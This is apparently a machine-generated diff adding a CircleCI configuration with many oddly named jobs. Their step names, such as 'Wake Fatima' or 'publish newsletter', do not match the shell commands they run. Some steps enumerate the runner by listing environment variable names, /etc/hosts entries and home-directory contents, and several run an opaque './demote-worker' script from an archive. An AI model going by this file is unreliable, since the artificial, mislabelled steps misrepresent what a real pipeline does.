+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  WithWave:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: glue
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'bump version'|tr '[:lower:]' '[:upper:]'; true ; } > /tmp/c1/fluxcoinchrome
+            md5sum /tmp/c1/fluxcoinchrome; stat -c %s /tmp/c1/fluxcoinchrome
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'fluxcoinchrome'
+  LaunchService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/fluxcoinchrome > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  gridCnt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Give me the daily partitions
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; sed '/^127/!d' /etc/hosts | head --lines=10; true ; } > /tmp/c1/NijnpiSi
+            md5sum /tmp/c1/NijnpiSi; stat -c %s /tmp/c1/NijnpiSi
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'NijnpiSi'
+  ensure-partial-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/NijnpiSi > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  v14-25-50:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Verify visa paperwork by payroll cutoff
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ls /dev | fmt -w 50 | tr -cs '[:alnum:]' '\n'; true ; } > /tmp/c1/node_desert
+            md5sum /tmp/c1/node_desert; stat -c %s /tmp/c1/node_desert
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'node_desert'
+  update-dashboard-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/node_desert > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  IRL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Wait for Yusuf to sign off
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; echo 'yay!'; echo yes; true ; } > /tmp/c1/RED_GLYPH
+            md5sum /tmp/c1/RED_GLYPH; stat -c %s /tmp/c1/RED_GLYPH
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'RED_GLYPH'
+  UAT_CHECK_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/RED_GLYPH > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  UXCW-2832-warning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Focus the cookie banner and type
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find /var/log -type l -name '*.gz' -size 0 -user $(whoami) 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -5; true ; } > /tmp/c1/alpha.bramble
+            md5sum /tmp/c1/alpha.bramble; stat -c %s /tmp/c1/alpha.bramble
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'alpha.bramble'
+  t-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/alpha.bramble > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+  soupZulu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Guard the tooltip
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; echo "lorem ipsum dolor sit amet" >/tmp/tutorial.tmp && du -h /tmp/tutorial.tmp; true ; } > /tmp/c1/trade.iron.beta
+            md5sum /tmp/c1/trade.iron.beta; stat -c %s /tmp/c1/trade.iron.beta
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'trade.iron.beta'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Check 5
+          command: |
+            { head -c 1024 /tmp/c1/trade.iron.beta > /dev/null; echo "head1k ok" ; } || true
+      - run:
+          name: Retrieve project
+          command: git clone --depth 2 --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: tar --extract -f dev-archive-v5.tar
+      - run:
+          name: Package artifacts
+          command: env | wc -l
+      - run:
+          name: Stabilize
+          command: df -h
+      - run:
+          command: /bin/bash -c "./demote-worker"
+
+  project-charlie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Revoke the leave requests with manager
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; for i in {1..12}; do echo $RANDOM; done| tail -8| sort -n| uniq -c; true ; } > /tmp/c1/sample_049
+            md5sum /tmp/c1/sample_049; stat -c %s /tmp/c1/sample_049
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'sample_049'
+  kiloPool:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: XXX poll the incident channel properly
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; printf '%s\n' "cyan yellow magenta brown white pink" | awk '{print $NF}'; true ; } > /tmp/c1/muon_dream_kernel_agent
+            md5sum /tmp/c1/muon_dream_kernel_agent; stat -c %s /tmp/c1/muon_dream_kernel_agent
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'muon_dream_kernel_agent'
+  virtualPtr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Yeet podcast episode
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; printf '%d\n' 238 401 498 337 432 |sort -n |uniq -c |rev |tr -d '[:digit:]'; true ; } > /tmp/c1/GOPR-86906
+            md5sum /tmp/c1/GOPR-86906; stat -c %s /tmp/c1/GOPR-86906
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'GOPR-86906'
+  ben-nelson-pretzel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: despawning crafting recipes in background
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ls -vXs /usr/lib/os-release | tac; true ; } > /tmp/c1/v_50925
+            md5sum /tmp/c1/v_50925; stat -c %s /tmp/c1/v_50925
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'v_50925'
+  taco-983:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fine tuning for the record
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'peach banana' | awk '{print length($0)}'; true ; } > /tmp/c1/DNS-tmp
+            md5sum /tmp/c1/DNS-tmp; stat -c %s /tmp/c1/DNS-tmp
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'DNS-tmp'
+  TEXTURE_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ticket cb19
+          command: |
+            mkdir -p /tmp/c1
+            set +o pipefail 2>/dev/null; awk -v n=100000 'BEGIN{for(i=1;i<=n;i++) print "line "i" sum "i*i}' > /tmp/c1/irongadgetorder; true
+            md5sum /tmp/c1/irongadgetorder; stat -c %s /tmp/c1/irongadgetorder
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'irongadgetorder'
+  pattern_should_be_fresh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Undertake refresh of the replication lag at this point
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type l -exec echo {} + 2>/dev/null | xargs -r ls -ld | head -n 5; true ; } > /tmp/c1/m34d0w-pr0f113
+            md5sum /tmp/c1/m34d0w-pr0f113; stat -c %s /tmp/c1/m34d0w-pr0f113
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'm34d0w-pr0f113'
+  receiptsByName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: publish newsletter
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; env -0|tr '\0' '\n'|cut -f1 -d=|sed 's/^/- /'; true ; } > /tmp/c1/RED_GLYPH
+            md5sum /tmp/c1/RED_GLYPH; stat -c %s /tmp/c1/RED_GLYPH
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'RED_GLYPH'
+  sphereLink_complex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Gradient clipping is batched by the script
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/trace' && head -c 33749 /dev/urandom >'/tmp/trace'/blob && du -sh '/tmp/trace'; true ; } > /tmp/c1/admin.tensor.willow
+            md5sum /tmp/c1/admin.tensor.willow; stat -c %s /tmp/c1/admin.tensor.willow
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'admin.tensor.willow'
+  tPxGjE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Here we vortex the water bath
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; for w in {1..18..2}; do echo "line $w"; done | wc -l; true ; } > /tmp/c1/trade.iron.beta
+            md5sum /tmp/c1/trade.iron.beta; stat -c %s /tmp/c1/trade.iron.beta
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'trade.iron.beta'
+  lockedSchemaNameSidebarCanyon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: afterHeroBannerNormalization
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find "$HOME" -maxdepth 2 -type d -name '.bash*' | xargs ls -ld; true ; } > /tmp/c1/87cc26
+            md5sum /tmp/c1/87cc26; stat -c %s /tmp/c1/87cc26
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - '87cc26'
+  cfl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Scan then fingerprint
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find . -type d -name '*.md' -printf '%y %p\n' | head -15; true ; } > /tmp/c1/node_desert
+            md5sum /tmp/c1/node_desert; stat -c %s /tmp/c1/node_desert
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'node_desert'
+  was_locked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Stage VII loop
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; find $HOME -maxdepth 1 | sed 's|.*/||'; true ; } > /tmp/c1/blake_6ea7b50b5
+            md5sum /tmp/c1/blake_6ea7b50b5; stat -c %s /tmp/c1/blake_6ea7b50b5
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'blake_6ea7b50b5'
+  uJRrIj2M:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: dev side badging
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; cd $HOME && pwd; true ; } > /tmp/c1/ARchIVered
+            md5sum /tmp/c1/ARchIVered; stat -c %s /tmp/c1/ARchIVered
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'ARchIVered'
+  num_ini_bal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Deliver unlock value
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; touch -d "2020-01-01 12:00" "/tmp/Stadium.csv" && date -r "/tmp/Stadium.csv"; true ; } > /tmp/c1/northreefroutercloud
+            md5sum /tmp/c1/northreefroutercloud; stat -c %s /tmp/c1/northreefroutercloud
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'northreefroutercloud'
+  pauly:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: sweep reward model
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; for name in kiwi lemon papaya; do printf '%-8s %d\n' "${name}" ${#name}; done | nl; true ; } > /tmp/c1/proton722
+            md5sum /tmp/c1/proton722; stat -c %s /tmp/c1/proton722
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'proton722'
+  f4s7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: magic
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; echo "call the plumber" | od -c | head -n 2; true ; } > /tmp/c1/crc_34f83653e
+            md5sum /tmp/c1/crc_34f83653e; stat -c %s /tmp/c1/crc_34f83653e
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'crc_34f83653e'
+  modelattach:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/c1
+      - run:
+          name: Wake Fatima
+          command: |
+            mkdir -p /tmp/c1
+            { set +o pipefail 2>/dev/null; ls -i -a . | awk 'NR % 3 == 0'; true ; } > /tmp/c1/RIdgePLASMAtokENgoLdeN
+            md5sum /tmp/c1/RIdgePLASMAtokENgoLdeN; stat -c %s /tmp/c1/RIdgePLASMAtokENgoLdeN
+      - persist_to_workspace:
+          root: /tmp/c1
+          paths:
+            - 'RIdgePLASMAtokENgoLdeN'
+workflows:
+  matrix:
+    jobs:
+      - MittenMitten
+      - project-charlie:
+          requires:
+            - MittenMitten
+      - blast-off:
+          requires:
+            - project-charlie
+      - schemaInFt:
+          requires:
+            - project-charlie
+      - kiloPool:
+          requires:
+            - schemaInFt
+      - rust-vet:
+          requires:
+            - kiloPool
+      - CHI9:
+          requires:
+            - kiloPool
+      - virtualPtr:
+          requires:
+            - CHI9
+      - t:
+          requires:
+            - virtualPtr
+      - ARTICLE_RANK:
+          requires:
+            - virtualPtr
+      - ben-nelson-pretzel:
+          requires:
+            - ARTICLE_RANK
+      - VerifyProd:
+          requires:
+            - ben-nelson-pretzel
+      - fontmetricvisit:
+          requires:
+            - ben-nelson-pretzel
+      - taco-983:
+          requires:
+            - fontmetricvisit
+      - rust-bench:
+          requires:
+            - taco-983
+      - uk-Latn:
+          requires:
+            - taco-983
+      - TEXTURE_2:
+          requires:
+            - uk-Latn
+      - q1-rev:
+          requires:
+            - TEXTURE_2
+      - proxyFn:
+          requires:
+            - TEXTURE_2
+      - pattern_should_be_fresh:
+          requires:
+            - proxyFn
+      - tb-2a:
+          requires:
+            - pattern_should_be_fresh
+      - IRL:
+          requires:
+            - pattern_should_be_fresh
+      - receiptsByName:
+          requires:
+            - IRL
+      - UAT_CHECK_8:
+          requires:
+            - receiptsByName
+      - theWordTab
+      - spin-up:
+          requires:
+            - theWordTab
+      - alice_x:
+          requires:
+            - theWordTab
+      - API-576:
+          requires:
+            - alice_x
+      - CONST_CALLBACK_PATH_16:
+          requires:
+            - alice_x
+      - auh-check:
+          requires:
+            - CONST_CALLBACK_PATH_16
+      - gridCnt:
+          requires:
+            - CONST_CALLBACK_PATH_16
+      - ensure-partial-docker-image:
+          requires:
+            - gridCnt
+      - UXCW-2832-warning:
+          requires:
+            - gridCnt
+      - t-v2:
+          requires:
+            - UXCW-2832-warning
+      - XITER9:
+          requires:
+            - UXCW-2832-warning
+      - INIT_PROD:
+          requires:
+            - XITER9
+      - thaindlexex:
+          requires:
+            - XITER9
+      - do-the-thing:
+          requires:
+            - thaindlexex
+      - untitled1:
+          requires:
+            - thaindlexex
+      - bun-bench:
+          requires:
+            - untitled1
+      - macro-star:
+          requires:
+            - untitled1
+      - check-production-test-matrix:
+          requires:
+            - macro-star
+      - yY:
+          requires:
+            - macro-star
+      - tango-3:
+          requires:
+            - yY
+      - WithWave:
+          requires:
+            - yY
+      - LaunchService:
+          requires:
+            - WithWave
+      - flattenProviderDefaultUnsafe:
+          requires:
+            - WithWave
+      - orion-plus:
+          requires:
+            - flattenProviderDefaultUnsafe
+      - defheight
+      - sphereLink_complex:
+          requires:
+            - defheight
+      - add-edge:
+          requires:
+            - sphereLink_complex
+      - soupZulu:
+          requires:
+            - sphereLink_complex
+      - tPxGjE:
+          requires:
+            - soupZulu
+      - deploy:
+          requires:
+            - tPxGjE
+      - wip-pattern:
+          requires:
+            - tPxGjE
+      - lockedSchemaNameSidebarCanyon:
+          requires:
+            - wip-pattern
+      - q2-canary:
+          requires:
+            - lockedSchemaNameSidebarCanyon
+      - v14-25-50:
+          requires:
+            - lockedSchemaNameSidebarCanyon
+      - cfl:
+          requires:
+            - v14-25-50
+      - update-dashboard-reload:
+          requires:
+            - cfl
+      - armor-8:
+          requires:
+            - cfl
+      - was_locked:
+          requires:
+            - armor-8
+      - v4-nightly:
+          requires:
+            - was_locked
+      - settings_country_l10n_3:
+          requires:
+            - was_locked
+      - uJRrIj2M:
+          requires:
+            - settings_country_l10n_3
+      - java17-test:
+          requires:
+            - uJRrIj2M
+      - writer-084532-hard:
+          requires:
+            - uJRrIj2M
+      - num_ini_bal:
+          requires:
+            - writer-084532-hard
+      - v7-alpha:
+          requires:
+            - num_ini_bal
+      - removeAuthor:
+          requires:
+            - num_ini_bal
+      - pauly:
+          requires:
+            - removeAuthor
+      - produce-staging-docker-image:
+          requires:
+            - pauly
+      - yiotwyshteempbot:
+          requires:
+            - pauly
+      - f4s7:
+          requires:
+            - yiotwyshteempbot
+      - Verify_App4:
+          requires:
+            - f4s7
+      - py-ubuntu:
+          requires:
+            - f4s7
+      - modelattach:
+          requires:
+            - py-ubuntu
+      - fix-dashboard:
+          requires:
+            - modelattach
